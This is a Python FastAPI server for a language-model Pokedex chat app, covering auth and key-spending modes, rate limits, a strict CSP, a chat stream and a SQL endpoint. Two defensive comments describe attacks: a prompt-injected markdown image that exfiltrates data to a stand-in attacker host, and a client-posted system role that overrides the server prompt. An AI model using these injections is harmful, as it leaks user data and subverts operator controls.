"""FastAPI host: static UI, local sprite files, SSE chat endpoint."""
from __future__ import annotations

import asyncio
import json
import time
from contextlib import asynccontextmanager
from pathlib import Path
from typing import Literal

import httpx
from fastapi import FastAPI, Header, HTTPException, Request
from fastapi.concurrency import run_in_threadpool
from fastapi.middleware.cors import CORSMiddleware
from fastapi.responses import FileResponse, Response, StreamingResponse
from fastapi.staticfiles import StaticFiles
from pydantic import BaseModel, Field

import agent
import observability as obs
import pokedb
import security
import sprites as sprite_proxy
from config import BOOT_TIME, allow_open, app_password, sec, settings, verify_password

ROOT = Path(__file__).resolve().parent

STATE: dict[str, str] = {"provider": settings.provider, "model": ""}


# ---------------------------------------------------------------------------
# Who is allowed to spend which key.  Fail closed: the key in .env is NOT
# spendable by default — something has to unlock it.
#
#   "byok"     — no key in .env at all. Everyone brings their own.
#   "password" — APP_PASSWORD is set. That password unlocks the server's key;
#                without it a visitor must bring their own.
#   "locked"   — a key is in .env but nothing unlocks it. The server refuses to
#                spend it; visitors must bring their own key. This is what you
#                get if you forget to set APP_PASSWORD.
#   "open"     — ALLOW_OPEN=true. No password, no key needed: anyone who can
#                reach the port spends your key. Only ever for solo localhost.
#
# Every value below is read live from .env, so changing the password or revoking
# ALLOW_OPEN takes effect on the next request without a restart.
#
# A caller-supplied key always wins over the server's, and is used for that one
# request only: it is never written to disk, never logged, never cached.
# ---------------------------------------------------------------------------
def auth_mode() -> str:
    if not agent.env_key(STATE["provider"]):
        return "byok"
    if app_password():
        return "password"
    if allow_open():
        return "open"
    return "locked"


def client_ip(request: Request) -> str:
    if settings.trust_proxy:
        fwd = request.headers.get("x-forwarded-for", "")
        if fwd:
            return fwd.split(",")[0].strip()
    return request.client.host if request.client else "unknown"


def resolve_key(
    api_key: str | None,
    password: str | None,
    *,
    ip: str = "unknown",
) -> str | None:
    """Returns the key to use, or raises 401 explaining what is missing.

    Failed password attempts are rate-limited with exponential backoff: constant-time
    comparison defeats the timing attack, but only a lockout defeats online guessing.
    """
    if api_key and api_key.strip():
        return api_key.strip()
    mode = auth_mode()
    if mode == "open":
        return None  # fall through to the .env key inside agent
    if mode == "password":
        wait = security.lockout.locked_for(ip)
        if wait > 0:
            obs.warn("auth.locked_out", ip=ip, seconds=round(wait, 1))
            raise HTTPException(
                status_code=429,
                detail=f"Too many wrong passwords. Try again in {int(wait) + 1}s.",
                headers={"Retry-After": str(int(wait) + 1)},
            )
        if verify_password(password, app_password()):
            security.lockout.record_success(ip)
            return None
        delay = security.lockout.record_failure(ip)
        obs.warn("auth.bad_password", ip=ip, backoff=round(delay, 1))
        raise HTTPException(
            status_code=401,
            detail="Wrong or missing password. Enter the password, or add your own API key.",
        )
    if mode == "locked":
        raise HTTPException(
            status_code=401,
            detail=(
                "The server's own key is locked: no APP_PASSWORD is configured, so it "
                "will not be spent. Add your own API key in Settings — or, if you own "
                "this server, set APP_PASSWORD in .env (or ALLOW_OPEN=true for solo "
                "localhost use). It takes effect immediately, no restart."
            ),
        )
    raise HTTPException(
        status_code=401,
        detail="This server has no API key of its own. Add your own key in Settings.",
    )


def enforce_limit(limiter: security.RateLimiter, key: str, what: str) -> None:
    ok, retry = limiter.check(key)
    if not ok:
        obs.warn("ratelimit.blocked", bucket=what, key=key, retry_after=round(retry, 1))
        raise HTTPException(
            status_code=429,
            detail=f"Too many requests. Try again in {int(retry) + 1}s.",
            headers={"Retry-After": str(int(retry) + 1)},
        )


# ---------------------------------------------------------------------------
# lifespan
# ---------------------------------------------------------------------------
@asynccontextmanager
async def lifespan(app: FastAPI):
    obs.setup_logging()
    agent.set_client(
        httpx.AsyncClient(
            timeout=httpx.Timeout(180.0, connect=20.0),
            limits=httpx.Limits(max_connections=50, max_keepalive_connections=20),
        )
    )
    try:
        STATE["model"] = await agent.pick_default_model(STATE["provider"])
    except Exception as e:
        STATE["model"] = agent.MODEL_PREFERENCE[0]
        obs.warn("startup.model_discovery_failed", err=repr(e), fallback=STATE["model"])

    mode = auth_mode()
    obs.info(
        "startup",
        provider=STATE["provider"],
        model=STATE["model"],
        auth=mode,
        prompt_version=agent.PROMPT_VERSION,
        db=pokedb.db_stats(),
    )
    if mode == "locked":
        obs.warn("startup.key_locked",
                 hint="set APP_PASSWORD in .env (python scripts/set_password.py) — "
                      "no restart needed; or ALLOW_OPEN=true for solo localhost")
    elif mode == "open":
        obs.warn("startup.open_mode",
                 hint="ALLOW_OPEN is on — anyone who reaches this port spends your key")

    pruner = asyncio.create_task(_prune_loop())
    try:
        yield
    finally:
        pruner.cancel()
        client = agent.client()
        agent.set_client(None)
        await client.aclose()
        obs.info("shutdown")


async def _prune_loop() -> None:
    """Keep the rate-limit tables from growing without bound."""
    while True:
        try:
            await asyncio.sleep(600)
            for lim in (security.chat_limiter, security.sql_limiter, security.verify_limiter):
                lim.prune()
        except asyncio.CancelledError:
            return
        except Exception as e:
            obs.warn("prune.failed", err=repr(e))


app = FastAPI(title=settings.app_title, lifespan=lifespan)

# Explicit, not accidental: the app is same-origin by design. Recording that here
# means nobody later "fixes" a CORS error by adding allow_origins=["*"] and quietly
# exposing every endpoint to any page on the internet.
_origins = [o.strip() for o in settings.cors_origins.split(",") if o.strip()]
app.add_middleware(
    CORSMiddleware,
    allow_origins=_origins,
    allow_credentials=bool(_origins),
    allow_methods=["GET", "POST"],
    allow_headers=["Content-Type", "X-Api-Key", "X-App-Password"],
)

# Every sprite is local and every frontend library is vendored, so 'self' costs
# nothing — and it shuts the markdown-image exfiltration path: the model renders
# untrusted web content, and an injected ![](https://attacker/?d=…) would
# otherwise be a well-formed image that DOMPurify happily keeps and the browser
# dutifully fetches.
CSP = (
    "default-src 'self'; "
    "img-src 'self' data:; "
    "script-src 'self'; "
    "style-src 'self' 'unsafe-inline'; "   # KaTeX writes inline styles
    "font-src 'self'; "
    "connect-src 'self'; "
    "form-action 'none'; "
    "frame-ancestors 'none'; "
    "base-uri 'none'; "
    "object-src 'none'"
)
SECURITY_HEADERS = {
    "Content-Security-Policy": CSP,
    "X-Content-Type-Options": "nosniff",
    "X-Frame-Options": "DENY",
    "Referrer-Policy": "no-referrer",
    "Cross-Origin-Opener-Policy": "same-origin",
}


@app.middleware("http")
async def _observe(request: Request, call_next):
    rid = obs.new_request_id()
    started = time.perf_counter()
    try:
        resp = await call_next(request)
    except Exception:
        obs.error("http.unhandled", path=request.url.path, method=request.method)
        raise
    ms = int((time.perf_counter() - started) * 1000)
    if not request.url.path.startswith(("/sprites/", "/static/")):
        obs.info("http", method=request.method, path=request.url.path,
                 status=resp.status_code, ms=ms)
    for k, v in SECURITY_HEADERS.items():
        resp.headers.setdefault(k, v)
    resp.headers["X-Request-Id"] = rid
    # sprites are immutable content-addressed files; stop revalidating them forever
    if request.url.path.startswith("/sprites/"):
        resp.headers.setdefault("Cache-Control", "public, max-age=31536000, immutable")
    elif request.url.path.startswith("/static/"):
        # Revalidate, don't cache blind. These filenames are not content-hashed,
        # so a max-age here serves a stale app.js after every deploy — and the
        # ETag StaticFiles already sends makes revalidation a cheap 304.
        resp.headers.setdefault("Cache-Control", "no-cache")
    return resp


if pokedb.SPRITE_SOURCE == "local":
    app.mount("/sprites", StaticFiles(directory=ROOT / "assets" / "sprites"), name="sprites")
else:
    # Deployed without the 754 MB sprite tree: serve the same URLs from our own
    # origin, fetching allowlisted paths from the upstream CDN on first use. The
    # CSP stays at `img-src 'self'` — see sprites.py for why that matters here.
    @app.get("/sprites/{rel:path}")
    async def sprite(rel: str) -> Response:
        if not sprite_proxy.is_allowed(rel):
            raise HTTPException(status_code=404, detail="no such sprite")
        data = await sprite_proxy.fetch(rel, agent.client())
        if data is None:
            raise HTTPException(status_code=404, detail="no such sprite")
        return Response(
            content=data,
            media_type="image/png",
            headers={"Cache-Control": "public, max-age=31536000, immutable"},
        )
app.mount("/static", StaticFiles(directory=ROOT / "static"), name="static")


@app.get("/")
async def index() -> FileResponse:
    return FileResponse(ROOT / "static" / "index.html")


# ---------------------------------------------------------------------------
# health: liveness is public, diagnostics are not
# ---------------------------------------------------------------------------
@app.get("/api/health")
async def health() -> dict:
    """Liveness only. Deliberately says nothing about keys, models or auth mode —
    `auth_mode` alone tells an attacker which attack applies."""
    return {"ok": True}


@app.get("/api/config")
async def public_config() -> dict:
    """The minimum the UI needs to render before a credential exists."""
    return {
        "auth_mode": auth_mode(),
        "db": pokedb.db_stats(),
        "default_model": STATE["model"],
    }


@app.get("/api/diagnostics")
async def diagnostics(
    x_api_key: str | None = Header(default=None),
    x_app_password: str | None = Header(default=None),
    request: Request = None,  # type: ignore[assignment]
) -> dict:
    resolve_key(x_api_key, x_app_password, ip=client_ip(request))
    return {
        "provider": STATE["provider"],
        "model": STATE["model"],
        "auth_mode": auth_mode(),
        "prompt_version": agent.PROMPT_VERSION,
        "has_openrouter_key": bool(agent.env_key("openrouter")),
        "has_groq_key": bool(agent.env_key("groq")),
        "uptime_s": int(time.time() - BOOT_TIME),
        "secrets_generation": sec.generation,
        "spend": security.ledger.snapshot(),
        "lockout": security.lockout.snapshot(),
        "db": pokedb.db_stats(),
    }


@app.post("/api/verify")
async def verify(
    request: Request,
    x_api_key: str | None = Header(default=None),
    x_app_password: str | None = Header(default=None),
) -> dict:
    """Check a password or a browser-supplied key before the first message."""
    ip = client_ip(request)
    enforce_limit(security.verify_limiter, f"ip:{ip}", "verify")
    if x_api_key and x_api_key.strip():
        try:
            info = await agent.check_key(STATE["provider"], x_api_key.strip())
        except Exception as e:
            obs.warn("verify.key_rejected", err=repr(e))
            raise HTTPException(status_code=401, detail="That key was rejected by the provider.") from e
        return {"ok": True, "using": "your key", "key": info}
    resolve_key(None, x_app_password, ip=ip)
    return {"ok": True, "using": "shared key"}


@app.get("/api/models")
async def models(
    request: Request,
    provider: str | None = None,
    all: bool = False,
    x_api_key: str | None = Header(default=None),
    x_app_password: str | None = Header(default=None),
) -> dict:
    """Curated shortlist by default; `?all=true` for the whole tool-capable catalogue."""
    ip = client_ip(request)
    resolve_key(x_api_key, x_app_password, ip=ip)
    enforce_limit(security.sql_limiter, security.client_key(ip, x_api_key), "models")
    p = provider if provider in ("openrouter", "groq") else STATE["provider"]
    try:
        return {
            "provider": p,
            "curated": not all,
            "models": await agent.list_models(
                p, (x_api_key or "").strip() or None, curated=not all
            ),
            "current": STATE["model"],
        }
    except Exception as e:
        obs.error("models.failed", err=repr(e))
        raise HTTPException(
            status_code=502,
            detail=f"Could not load the model list (reference {obs.request_id_var.get()}).",
        ) from e


class Msg(BaseModel):
    # NOT `str`: an unconstrained role lets a caller post role="system" and have it
    # land after our own system prompt, where most providers let it win. That would
    # make "never invent a number" a client-side promise instead of a server-side one.
    role: Literal["user", "assistant"]
    content: str = Field(min_length=1, max_length=32_000)


class ChatReq(BaseModel):
    messages: list[Msg] = Field(min_length=1, max_length=100)
    model: str | None = Field(default=None, max_length=200)
    provider: Literal["openrouter", "groq"] | None = None


@app.post("/api/chat")
async def chat(
    req: ChatReq,
    request: Request,
    x_api_key: str | None = Header(default=None),
    x_app_password: str | None = Header(default=None),
) -> StreamingResponse:
    ip = client_ip(request)
    provider = req.provider or STATE["provider"]
    key = resolve_key(x_api_key, x_app_password, ip=ip)
    own_key = key is None            # None ⇒ we are spending the server's key

    enforce_limit(security.chat_limiter, security.client_key(ip, x_api_key), "chat")
    if own_key and security.ledger.would_exceed():
        snap = security.ledger.snapshot()
        obs.warn("spend.daily_ceiling_hit", **snap)
        raise HTTPException(
            status_code=429,
            detail=(
                f"This server's daily budget (${snap['usd_ceiling']}) is spent. "
                "Add your own API key in Settings to keep going, or try tomorrow."
            ),
        )

    total_chars = sum(len(m.content) for m in req.messages)
    if total_chars > 120_000:
        raise HTTPException(status_code=413, detail="Conversation too long. Start a new chat.")

    model = req.model or STATE["model"] or await agent.pick_default_model(provider, key)
    history = [{"role": m.role, "content": m.content} for m in req.messages]

    price_in, price_out = await agent.model_price(provider, model, key)
    cost = obs.CostTracker(model, price_in, price_out)
    rid = obs.request_id_var.get()
    fp = obs.fingerprint(x_api_key or x_app_password)
    obs.info("chat.started", model=model, provider=provider, msgs=len(history),
             chars=total_chars, credential=fp, own_key=own_key)

    async def gen():
        try:
            async for chunk in agent.stream_chat(
                history,
                model=model,
                provider=provider,
                api_key=key,
                cost=cost,
                is_disconnected=request.is_disconnected,
            ):
                yield chunk
        except asyncio.CancelledError:
            obs.info("chat.aborted", credential=fp, **cost.as_fields())
            raise
        finally:
            security.ledger.record(cost.usd, cost.tokens_in, cost.tokens_out, own_key)
            obs.info("chat.completed", credential=fp, own_key=own_key, **cost.as_fields())

    return StreamingResponse(
        gen(),
        media_type="text/event-stream",
        headers={
            "Cache-Control": "no-cache",
            "X-Accel-Buffering": "no",
            "Connection": "keep-alive",
            "X-Request-Id": rid,
        },
    )


class SqlReq(BaseModel):
    sql: str = Field(min_length=1, max_length=20_000)


@app.post("/api/sql")
async def sql(
    req: SqlReq,
    request: Request,
    x_api_key: str | None = Header(default=None),
    x_app_password: str | None = Header(default=None),
) -> dict:
    """Escape hatch: run your own query against the Pokedex.

    Gated like /api/chat. It spends no tokens, but an unauthenticated SELECT is
    still an unauthenticated CPU-burn primitive against a 638k-row view.
    """
    ip = client_ip(request)
    resolve_key(x_api_key, x_app_password, ip=ip)
    enforce_limit(security.sql_limiter, security.client_key(ip, x_api_key), "sql")
    try:
        return await run_in_threadpool(pokedb.run_sql, req.sql)
    except pokedb.SqlError as e:
        raise HTTPException(status_code=400, detail=str(e)) from e


@app.get("/api/schema")
async def schema() -> dict:
    return {"schema": pokedb.schema_doc()}


DEMO_MD = """\
**Blaziken** wins: base **Attack 120 + Special Attack 110 = 230**, the highest of any
starter final evolution. Mega Blaziken pushes it to $160 + 130 = 290$.

| # | Pokemon | Types | Atk | SpA | Atk+SpA |
|---|---------|-------|----:|----:|--------:|
| 1 | Blaziken | Fire / Fighting | 120 | 110 | 230 |
| 2 | Emboar | Fire / Fighting | 123 | 100 | 223 |
| 3 | Inteleon | Water | 85 | 125 | 210 |

![Blaziken](/sprites/pokemon/other/official-artwork/257.png)

```chart
{"type":"hbar","title":"Attack + Special Attack",
 "labels":["Blaziken","Emboar","Inteleon","Infernape","Samurott"],
 "series":[{"name":"Atk+SpA","data":[230,223,210,208,208]}]}
```

```chart
{"type":"radar","title":"Blaziken base stats",
 "labels":["HP","Atk","Def","SpA","SpD","Spe"],
 "series":[{"name":"Blaziken","data":[80,120,70,110,70,80]}]}
```

```mermaid
graph LR
  A[Torchic] -->|Lv 16| B[Combusken]
  B -->|Lv 36| C[Blaziken]
  C -->|Blazikenite| D[Mega Blaziken]
```

Damage uses $$\\text{dmg}=\\left(\\frac{(2L/5+2)\\cdot P\\cdot A/D}{50}+2\\right)\\cdot M$$
and a *Speed Boost* set is the [standard build](https://www.smogon.com/dex/).
"""


@app.get("/api/demo")
async def demo() -> StreamingResponse:
    """Canned SSE stream — renders every markdown feature without spending tokens."""

    async def gen():
        yield "data: " + json.dumps({"type": "tool_start", "id": "d1", "name": "sql_query",
                                     "label": "rank starters by Atk+SpA",
                                     "args": {"sql": "SELECT 1"}}) + "\n\n"
        await asyncio.sleep(0.3)
        yield "data: " + json.dumps({"type": "tool_end", "id": "d1", "name": "sql_query",
                                     "summary": "25 rows", "ms": 4,
                                     "result": {"columns": ["name", "off"],
                                                "rows": [["Blaziken", 230], ["Emboar", 223]],
                                                "row_count": 2, "truncated": False}}) + "\n\n"
        step = 7
        for i in range(0, len(DEMO_MD), step):
            yield "data: " + json.dumps({"type": "delta", "text": DEMO_MD[i:i + step]}) + "\n\n"
            await asyncio.sleep(0.012)
        yield "data: " + json.dumps({"type": "done"}) + "\n\n"

    return StreamingResponse(gen(), media_type="text/event-stream",
                             headers={"Cache-Control": "no-cache", "X-Accel-Buffering": "no"})


if __name__ == "__main__":
    import uvicorn

    uvicorn.run(app, host="127.0.0.1", port=settings.port)
